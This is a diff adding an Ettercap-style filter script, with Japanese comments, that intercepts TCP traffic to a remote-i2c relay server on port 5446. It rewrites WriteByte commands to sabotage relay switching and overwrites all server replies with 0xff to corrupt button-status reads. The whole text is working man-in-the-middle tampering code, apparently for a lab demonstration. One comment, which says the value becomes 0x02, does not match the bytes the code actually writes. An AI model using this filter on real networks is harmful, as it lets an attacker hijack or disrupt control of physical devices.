@@ -1,0 +1,37 @@
+if (ip.proto == TCP) {
+   # 待ち受けポート5446 のサーバーへの送信の場合
+   if (tcp.dst == 5446) {
+      # remote-i2cは最初の1バイトでコマンドを区別しています．
+      # ↓コマンド名と値の一覧
+      # https://gitlab.com/vectoridau/remote-i2c/-/blob/master/remote_i2c/commands.py
+      
+      if (DATA.data == "\x00") {
+         msg("ReadByte Command\n");
+      }
+      
+      # remote_i2c_cliet.py はWriteByteでI2Cアドレス0x6dに
+      # 0x0b，0x0a を送って全チャンネルのリレーのON/OFFを
+      # 切り替えています．ここでは送信する値を0x02に書き換えて
+      # Ch2のリレーだけがON/OFFする様に妨害しています． 
+      if (DATA.data == "\x01") {
+         msg("WriteByte Command\n");
+         DATA.data = "\x01\x6d\x00";
+      }
+      
+      if (DATA.data == "\x02") {
+         msg("ReadByteData Command\n");
+      }
+      
+      if (DATA.data == "\x03") {
+         msg("WriteByteData Command\n");
+      }
+   }
+
+   # 待ち受けポート5446のサーバーからの返信の場合
+   if (tcp.src == 5446) {
+      # remote_i2c_client_read_button_status.py で用いている
+      # bus.read_byte_data()でサーバーから送られるデータは1バイトなので，その1バイトを極端な値に
+      # 書き換えてサーバーからの通信を妨害します．
+      DATA.data = "\xff";
+   }
+}
